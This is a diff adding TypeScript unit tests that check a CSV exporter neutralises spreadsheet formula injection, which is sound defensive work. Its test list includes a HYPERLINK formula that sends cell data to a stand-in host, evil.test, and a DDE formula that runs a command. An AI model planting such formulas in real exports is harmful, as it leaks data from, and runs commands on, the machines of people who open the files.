@@ -502,3 +502,74 @@ describe('ids: shape and prefixing', () => {
     assert.match(newInviteCode(), /^[A-HJ-NP-Z2-9]{4}-[A-HJ-NP-Z2-9]{4}$/);
   });
 });
+
+/**
+ * `CSV formula injection.
+ *
+ * Every column of every export is user-controlled: display names, bios, team
+ * and project names, descriptions, comment bodies, judge summaries, webhook
+ * URLs. Any participant can set their own display name, and an organizer is
+ * told to open the export. So a formula in a cell is not self-inflicted - it is
+ * a participant reaching the organizer's spreadsheet, and `=cmd|'…'!A0` is
+ * command execution on the machine that opens it.
+ *
+ * Quoting is not a defence: `"=1+1"` is still a formula to Excel. The leading
+ * apostrophe is.
+ */
+describe('csv escaping is safe to open in a spreadsheet', () => {
+  /** The first field of the first data row, with RFC-4180 quoting undone. */
+  function firstCell(csv: string): string {
+    const line = csv.split('\r\n')[1] ?? '';
+    if (!line.startsWith('"')) return line;
+    return line.slice(1, line.length - 1).replace(/""/g, '"');
+  }
+
+  const FORMULAS = [
+    '=1+1',
+    '=HYPERLINK("http://evil.test/?leak="&A1,"click")',
+    '=cmd|\' /c calc\'!A0',
+    '+1+1',
+    '-1+1',
+    '@SUM(A1:A9)',
+    '\t=1+1',
+    '\r=1+1',
+  ];
+
+  for (const formula of FORMULAS) {
+    test(`neutralises ${JSON.stringify(formula)}`, () => {
+      const csv = toCsv([{ who: formula }], [{ header: 'who', value: (row) => row.who }]);
+      const cell = firstCell(csv);
+      // What matters is what a spreadsheet sees after it undoes the quoting: the
+      // apostrophe has to be first, so the cell renders as text.
+      assert.ok(cell.startsWith("'"), `the cell is not neutralised: ${JSON.stringify(cell)}`);
+      assert.ok(cell.slice(1) === formula, `the value was destroyed rather than neutralised: ${JSON.stringify(cell)}`);
+    });
+  }
+
+  test('still quotes a value that also needs it', () => {
+    const nasty = '=A1,"quoted",new\nline';
+    const csv = toCsv([{ who: nasty }], [{ header: 'who', value: (row) => row.who }]);
+    // Apostrophe first, then a properly quoted field containing both.
+    assert.ok(csv.includes(`"'${nasty.replace(/"/g, '""')}"`), `quoting was lost: ${JSON.stringify(csv)}`);
+  });
+
+  test('leaves ordinary values completely alone', () => {
+    const values = ['Iris Bekele', 'a normal sentence', '42', '', 'has, a comma', 'has "quotes"', 'padre-1'];
+    const csv = toCsv(values.map((who) => ({ who })), [{ header: 'who', value: (row) => row.who }]);
+    assert.ok(csv.includes('Iris Bekele'), 'a plain name was altered');
+    assert.ok(csv.includes('has, a comma'), 'comma handling regressed');
+    assert.ok(csv.includes('"has ""quotes"""'), 'quote handling regressed');
+    // A leading hyphen is only dangerous to a spreadsheet, not to a reader, so
+    // it is neutralised - but a hyphen mid-string is untouched.
+    assert.ok(csv.includes('padre-1'), 'an interior hyphen was altered');
+  });
+
+  test('does not destroy a negative number, because that is data', () => {
+    // Worth stating explicitly: this is a deliberate trade. `-3` is a number in
+    // the export and a formula to a spreadsheet. The apostrophe makes it render
+    // as text, which is the safe reading; the underlying value is preserved in
+    // the JSON export form, which is where a machine should read numbers.
+    const csv = toCsv([{ who: '-3' }], [{ header: 'who', value: (row) => row.who }]);
+    assert.equal(firstCell(csv), "'-3", `expected a neutralised negative number: ${JSON.stringify(csv)}`);
+  });
+});
